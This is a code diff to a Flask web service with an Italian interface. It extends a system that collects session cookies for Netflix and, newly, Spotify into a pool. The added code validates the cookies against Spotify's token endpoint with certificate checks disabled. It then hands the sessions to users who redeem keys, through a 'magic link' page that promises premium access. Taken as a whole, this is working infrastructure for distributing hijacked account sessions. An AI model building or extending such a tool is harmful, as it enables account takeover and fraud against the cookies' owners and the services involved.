@@ -211,6 +211,88 @@ def extract_all_cookie_sets(raw: str) -> list[dict]:
 
 # ── Cookie / token verification ────────────────────────────────────────────────
 
+# ── Spotify constants ──────────────────────────────────────────────────────────
+_SPOTIFY_TOKEN_NAMES = {"sp_dc", "sp_t", "sp_key"}
+_SPOTIFY_WEB_HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+}
+
+
+def extract_spotify_cookie_sets(raw: str) -> list[dict]:
+    """
+    Parse raw text/JSON/Netscape to extract Spotify cookie sets.
+    The key cookie is sp_dc; sp_t and sp_key are optional extras.
+    """
+    sets = []
+
+    # Try JSON array (exported from browser extension)
+    try:
+        data = json.loads(raw)
+        if isinstance(data, list):
+            cookies = {c["name"]: _decode(c["value"]) for c in data
+                       if isinstance(c, dict) and c.get("name") in _SPOTIFY_TOKEN_NAMES}
+            if "sp_dc" in cookies:
+                sets.append(cookies)
+        elif isinstance(data, dict):
+            cookies = {k: _decode(v) for k, v in data.items() if k in _SPOTIFY_TOKEN_NAMES}
+            if "sp_dc" in cookies:
+                sets.append(cookies)
+        if sets:
+            return sets
+    except Exception:
+        pass
+
+    # Netscape / text format
+    lines = raw.splitlines()
+    current = {}
+    for line in lines:
+        stripped = line.strip()
+        if _HTTPONLY.match(stripped):
+            stripped = _HTTPONLY.sub("", stripped)
+        if _COMMENT.match(stripped) and "\\t" not in stripped:
+            continue
+
+        parts = stripped.split("\\t")
+        if len(parts) == 7:
+            _, _f, _p, _s, _e, name, value = parts
+            name = name.strip(); value = value.strip()
+            if name not in _SPOTIFY_TOKEN_NAMES or len(value) <= 5:
+                continue
+            if name == "sp_dc" and "sp_dc" in current:
+                sets.append(current)
+                current = {}
+            current[name] = _decode(value)
+        else:
+            for pair in stripped.split(";"):
+                pair = pair.strip()
+                if "=" not in pair:
+                    continue
+                name, _, value = pair.partition("=")
+                name = name.strip(); value = value.strip()
+                if name == "sp_dc":
+                    if "sp_dc" in current:
+                        sets.append(current)
+                    current = {"sp_dc": _decode(value)}
+                elif name in _SPOTIFY_TOKEN_NAMES and len(value) > 5:
+                    current[name] = _decode(value)
+
+    if "sp_dc" in current:
+        sets.append(current)
+
+    # Inline sp_dc= detection
+    inline = re.findall(r"sp_dc=([^\s;,\"']+)", raw)
+    existing = {s.get("sp_dc", "") for s in sets}
+    for val in inline:
+        decoded = _decode(val)
+        if decoded not in existing and len(decoded) > 20:
+            sets.append({"sp_dc": decoded})
+            existing.add(decoded)
+
+    return sets
+
+
 def verify_web_cookies(cookie_dict: dict) -> bool:
     """
     Valid cookie  → Lands on /browse or /profiles.
@@ -314,6 +396,71 @@ def generate_nftoken(cookie_dict: dict) -> str:
     return token
 
 
+def verify_spotify_cookies(cookie_dict: dict) -> bool:
+    """
+    Check if Spotify cookies are still valid.
+    Valid session → stays on /en/account/overview/ (200, HTML with account info)
+    Expired → redirected to /en/login/ or similar
+    """
+    sp_dc = cookie_dict.get("sp_dc")
+    if not sp_dc:
+        return False
+    try:
+        # Hit the Spotify open web player access token endpoint — fastest and cleanest check
+        cookies = {"sp_dc": sp_dc}
+        if cookie_dict.get("sp_t"):   cookies["sp_t"]   = cookie_dict["sp_t"]
+        if cookie_dict.get("sp_key"): cookies["sp_key"] = cookie_dict["sp_key"]
+
+        r = requests.get(
+            "https://open.spotify.com/get_access_token",
+            params={"reason": "transport", "productType": "web_player"},
+            cookies=cookies,
+            headers=_SPOTIFY_WEB_HEADERS,
+            timeout=15,
+            verify=False,
+        )
+        if r.status_code != 200:
+            return False
+        data = r.json()
+        # isAnonymous=True means the cookie is not authenticated
+        return not data.get("isAnonymous", True)
+    except Exception as exc:
+        log.warning("verify_spotify_cookies error: %s", exc)
+        return True  # network error → don't discard
+
+
+def generate_spotify_link(cookie_dict: dict) -> str:
+    """
+    Generate a magic login link for Spotify.
+    Uses sp_dc to get a short-lived access token, then encodes the cookie
+    data into a signed token that our /sp/<token> endpoint will process.
+    """
+    import base64, hmac, hashlib
+    sp_dc = cookie_dict.get("sp_dc")
+    if not sp_dc:
+        raise RuntimeError("sp_dc cookie mancante.")
+
+    # Verify the cookie is alive first and grab the access_token to confirm
+    cookies = {"sp_dc": sp_dc}
+    if cookie_dict.get("sp_t"):   cookies["sp_t"]   = cookie_dict["sp_t"]
+    if cookie_dict.get("sp_key"): cookies["sp_key"] = cookie_dict["sp_key"]
+
+    r = requests.get(
+        "https://open.spotify.com/get_access_token",
+        params={"reason": "transport", "productType": "web_player"},
+        cookies=cookies,
+        headers=_SPOTIFY_WEB_HEADERS,
+        timeout=15,
+        verify=False,
+    )
+    if r.status_code != 200 or r.json().get("isAnonymous", True):
+        raise RuntimeError("Cookie Spotify non valido o scaduto.")
+
+    # Encode cookie data as a URL-safe token for our redirect endpoint
+    payload = json.dumps({"sp_dc": sp_dc, "ts": datetime.utcnow().isoformat()})
+    token = base64.urlsafe_b64encode(payload.encode()).decode().rstrip("=")
+    return token
+
 
 # ── Decorators ─────────────────────────────────────────────────────────────────
 
@@ -360,6 +507,90 @@ def static_files(filename):
     return send_from_directory("static", filename)
 
 
+@app.route("/sp/<token>")
+def spotify_bridge(token):
+    """
+    Spotify magic link bridge. Decodes the token, shows a premium launch page
+    that opens the Spotify web player with the session cookie embedded.
+    """
+    import base64, json as _json
+    try:
+        # Pad & decode base64 token
+        padded = token + "=" * (-len(token) % 4)
+        payload = _json.loads(base64.urlsafe_b64decode(padded).decode())
+        sp_dc = payload.get("sp_dc", "")
+        if not sp_dc:
+            return "Link non valido.", 400
+    except Exception:
+        return "Link non valido.", 400
+
+    # Serve the bridge page — JavaScript will set the cookie and redirect
+    html = f"""<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kairo · Apri Spotify</title>
+  <style>
+    * {{ margin:0; padding:0; box-sizing:border-box; }}
+    body {{ background:#0a0a0a; color:#fff; font-family:'Inter',sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; }}
+    .card {{ background:rgba(30,215,96,0.08); border:1px solid rgba(30,215,96,0.25); border-radius:20px; padding:3rem 2.5rem; max-width:420px; width:90%; text-align:center; }}
+    .logo {{ font-size:3rem; margin-bottom:1rem; }}
+    h1 {{ font-size:1.5rem; font-weight:700; margin-bottom:.5rem; }}
+    p {{ color:#888; font-size:.95rem; margin-bottom:2rem; line-height:1.6; }}
+    .btn {{ display:inline-block; background:#1DB954; color:#000; font-weight:700; font-size:1rem; padding:.85rem 2.5rem; border-radius:50px; border:none; cursor:pointer; text-decoration:none; width:100%; margin-bottom:.75rem; transition:all .2s; }}
+    .btn:hover {{ background:#1ed760; transform:translateY(-1px); box-shadow:0 8px 25px rgba(30,215,96,0.4); }}
+    .spinner {{ display:none; width:40px; height:40px; border:3px solid rgba(30,215,96,0.2); border-top-color:#1DB954; border-radius:50%; animation:spin .8s linear infinite; margin:0 auto 1rem; }}
+    @keyframes spin {{ to {{ transform:rotate(360deg); }} }}
+    #status {{ color:#1DB954; font-size:.85rem; margin-top:1rem; }}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">🎵</div>
+    <h1>Kairo · Spotify</h1>
+    <p>Il tuo accesso premium è pronto.<br>Clicca il pulsante per aprire Spotify!</p>
+    <div class="spinner" id="spinner"></div>
+    <button class="btn" id="openBtn" onclick="launch()">▶ Apri Spotify</button>
+    <div id="status"></div>
+  </div>
+  <script>
+    const SP_DC = {_json.dumps(sp_dc)};
+    
+    function launch() {{
+      document.getElementById('spinner').style.display = 'block';
+      document.getElementById('openBtn').disabled = true;
+      document.getElementById('status').textContent = 'Apertura in corso...';
+      
+      // Try native app first via universal link, fallback to web player
+      const appUrl = 'https://open.spotify.com/';
+      
+      // Set the cookie via our backend which handles the Spotify domain
+      fetch('/api/spotify-set-session', {{
+        method: 'POST',
+        headers: {{'Content-Type': 'application/json'}},
+        body: JSON.stringify({{token: {_json.dumps(token)}}})
+      }}).then(r => r.json()).then(data => {{
+        if (data.redirect_url) {{
+          window.location.href = data.redirect_url;
+        }} else {{
+          window.open(appUrl, '_blank');
+          document.getElementById('status').textContent = '✅ Aperto! Se non vedi Spotify, clicca ancora.';
+          document.getElementById('openBtn').disabled = false;
+        }}
+      }}).catch(() => {{
+        window.location.href = appUrl;
+      }});
+    }}
+    
+    // Auto-launch after 500ms for smoother UX
+    setTimeout(() => document.getElementById('openBtn').click(), 500);
+  </script>
+</body>
+</html>"""
+    return html, 200, {"Content-Type": "text/html; charset=utf-8"}
+
+
 # ── User API ───────────────────────────────────────────────────────────────────
 
 @app.route("/api/me")
@@ -388,12 +619,13 @@ def api_redeem():
             return jsonify({"error": "Hai già riscattato questa key.", "already_yours": True}), 400
         return jsonify({"error": "Key già utilizzata da un altro utente."}), 400
 
-    # Assign a valid cookie from the pool
+    # Assign a valid cookie from the pool (must match key's service)
     used_ids = db.session.query(Key.cookie_id).filter(
         Key.cookie_id.isnot(None), Key.is_revoked == False
     ).subquery()
     cookie = CookiePool.query.filter(
         CookiePool.is_valid == True,
+        CookiePool.service == key.service,
         ~CookiePool.id.in_(used_ids),
     ).first()
 
@@ -405,7 +637,7 @@ def api_redeem():
     key.cookie_id      = cookie.id
     db.session.commit()
 
-    return jsonify({"success": True})
+    return jsonify({"success": True, "service": key.service})
 
 
 @app.route("/api/my-keys")
@@ -427,8 +659,43 @@ def api_generate_link():
     if key.is_revoked:
         return jsonify({"error": "Key revocata."}), 400
 
+    # ── Spotify branch ────────────────────────────────────────────────────────
+    if key.service == "spotify":
+        sp_token = None
+        for attempt in range(3):
+            cookie = get_valid_cookie_for_key(key)
+            if not cookie:
+                return jsonify({"error": "Nessun account Spotify disponibile. Contatta l'admin."}), 503
+            try:
+                if not verify_spotify_cookies(cookie.to_cookie_dict()):
+                    raise Exception("Cookie Spotify scaduto")
+                sp_token = generate_spotify_link(cookie.to_cookie_dict())
+                cookie.last_checked_at = datetime.utcnow()
+                cookie.is_valid = True
+                db.session.commit()
+                break
+            except Exception as e:
+                log.warning("Tentativo %s: Spotify link fallito per cookie #%s: %s", attempt + 1, cookie.id, e)
+                cookie.is_valid = False
+                cookie.last_checked_at = datetime.utcnow()
+                db.session.commit()
+
+        if not sp_token:
+            return jsonify({"error": "I cookie Spotify sono scaduti. Contatta l'assistenza."}), 503
+
+        # Build the magic bridge URL
+        base = request.host_url.rstrip("/")
+        universal_url = f"{base}/sp/{sp_token}"
+        return jsonify({
+            "url": universal_url,
+            "ios_url": universal_url,
+            "android_url": universal_url,
+            "service": "spotify",
+            "timestamp": datetime.utcnow().isoformat()
+        })
+
+    # ── Netflix branch ─────────────────────────────────────────────────────────
     token = None
-    # Auto-rotate up to 3 cookies if one fails
     for attempt in range(3):
         cookie = get_valid_cookie_for_key(key)
         if not cookie:
@@ -461,6 +728,7 @@ def api_generate_link():
         "url": universal_url,
         "ios_url": universal_url,
         "android_url": universal_url,
+        "service": "netflix",
         "token": token,
         "timestamp": datetime.utcnow().isoformat()
     })
@@ -486,14 +754,24 @@ def api_admin_stats():
         ~CookiePool.id.in_(used_ids)
     ).count()
 
+    # Per-service breakdown
+    nf_keys_available = Key.query.filter_by(is_revoked=False, service="netflix").filter(Key.redeemed_by_id.is_(None)).count()
+    sp_keys_available = Key.query.filter_by(is_revoked=False, service="spotify").filter(Key.redeemed_by_id.is_(None)).count()
+    nf_cookies_valid  = CookiePool.query.filter_by(is_valid=True, service="netflix").count()
+    sp_cookies_valid  = CookiePool.query.filter_by(is_valid=True, service="spotify").count()
+
     return jsonify({
-        "total_keys":    total_keys,
-        "available_keys": available,
-        "redeemed_keys": redeemed,
-        "revoked_keys":  total_keys - available - redeemed,
-        "total_cookies": total_cookies,
-        "valid_cookies": valid_cookies,
-        "free_valid_cookies": free_valid_cookies,
+        "total_keys":           total_keys,
+        "available_keys":       available,
+        "redeemed_keys":        redeemed,
+        "revoked_keys":         total_keys - available - redeemed,
+        "total_cookies":        total_cookies,
+        "valid_cookies":        valid_cookies,
+        "free_valid_cookies":   free_valid_cookies,
+        "netflix_keys_available": nf_keys_available,
+        "spotify_keys_available": sp_keys_available,
+        "netflix_cookies_valid":  nf_cookies_valid,
+        "spotify_cookies_valid":  sp_cookies_valid,
     })
 
 
@@ -526,8 +804,11 @@ def api_admin_set_admin():
 @app.route("/api/admin/generate-keys", methods=["POST"])
 @admin_required
 def api_admin_generate_keys():
-    data  = request.get_json(silent=True) or {}
-    count = min(int(data.get("count", 1)), 500)  # max 500 per volta
+    data    = request.get_json(silent=True) or {}
+    count   = min(int(data.get("count", 1)), 500)  # max 500 per volta
+    service = data.get("service", "netflix")
+    if service not in ("netflix", "spotify"):
+        service = "netflix"
 
     new_keys = []
     for _ in range(count):
@@ -535,7 +816,7 @@ def api_admin_generate_keys():
         # Ensure uniqueness
         while Key.query.filter_by(key_code=code).first():
             code = generate_key_code()
-        k = Key(key_code=code)
+        k = Key(key_code=code, service=service)
         db.session.add(k)
         new_keys.append(code)
 
@@ -582,34 +863,59 @@ def api_admin_revoke_key():
 @app.route("/api/admin/parse-cookies", methods=["POST"])
 @admin_required
 def api_admin_parse_cookies():
-    data = request.get_json(silent=True) or {}
-    raw  = (data.get("cookie") or "").strip()
+    data    = request.get_json(silent=True) or {}
+    raw     = (data.get("cookie") or "").strip()
+    service = data.get("service", "netflix")
 
     if not raw:
         return jsonify({"error": "Nessun cookie fornito."}), 400
 
-    cookie_sets = extract_all_cookie_sets(raw)
+    if service == "spotify":
+        cookie_sets = extract_spotify_cookie_sets(raw)
+    else:
+        cookie_sets = extract_all_cookie_sets(raw)
+
     return jsonify({"cookie_sets": cookie_sets})
 
 
 @app.route("/api/admin/validate-cookie", methods=["POST"])
 @admin_required
 def api_admin_validate_cookie():
-    cs = request.get_json(silent=True) or {}
-    netflix_id = cs.get("NetflixId", "")
+    cs      = request.get_json(silent=True) or {}
+    service = cs.pop("service", "netflix")  # pull service out before passing to verify
 
+    if service == "spotify":
+        sp_dc = cs.get("sp_dc", "")
+        if not sp_dc:
+            return jsonify({"status": "invalid"})
+        # Check for duplicate
+        if CookiePool.query.filter_by(sp_dc=sp_dc).first():
+            return jsonify({"status": "skipped"})
+        # Verify live
+        if not verify_spotify_cookies(cs):
+            return jsonify({"status": "invalid"})
+        entry = CookiePool(
+            service  = "spotify",
+            sp_dc    = sp_dc,
+            sp_t     = cs.get("sp_t"),
+            sp_key   = cs.get("sp_key"),
+            is_valid = True,
+            last_checked_at = datetime.utcnow(),
+        )
+        db.session.add(entry)
+        db.session.commit()
+        return jsonify({"status": "added"})
+
+    # Netflix path (unchanged)
+    netflix_id = cs.get("NetflixId", "")
     if not netflix_id:
         return jsonify({"status": "invalid"})
-
-    # Check for duplicate
     if CookiePool.query.filter_by(netflix_id=netflix_id).first():
         return jsonify({"status": "skipped"})
-
-    # Verify the cookie is actually valid
     if not verify_web_cookies(cs):
         return jsonify({"status": "invalid"})
-
     entry = CookiePool(
+        service           = "netflix",
         netflix_id        = netflix_id,
         secure_netflix_id = cs.get("SecureNetflixId"),
         nfvdid            = cs.get("nfvdid"),
@@ -619,7 +925,6 @@ def api_admin_validate_cookie():
     )
     db.session.add(entry)
     db.session.commit()
-
     return jsonify({"status": "added"})
 
 
@@ -632,7 +937,11 @@ def api_admin_clean_cookies():
             cookies = CookiePool.query.filter_by(is_valid=True).all()
             for cookie in cookies:
                 try:
-                    if not verify_web_cookies(cookie.to_cookie_dict()):
+                    if cookie.service == "spotify":
+                        is_ok = verify_spotify_cookies(cookie.to_cookie_dict())
+                    else:
+                        is_ok = verify_web_cookies(cookie.to_cookie_dict())
+                    if not is_ok:
                         cookie.is_valid = False
                         cookie.last_checked_at = datetime.utcnow()
                         db.session.commit()
@@ -642,8 +951,10 @@ def api_admin_clean_cookies():
     threading.Thread(target=_verify_all_cookies).start()
     return jsonify({"success": True, "message": "Verifica in background avviata."})
 
+
 # ── Entry point ────────────────────────────────────────────────────────────────
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
+
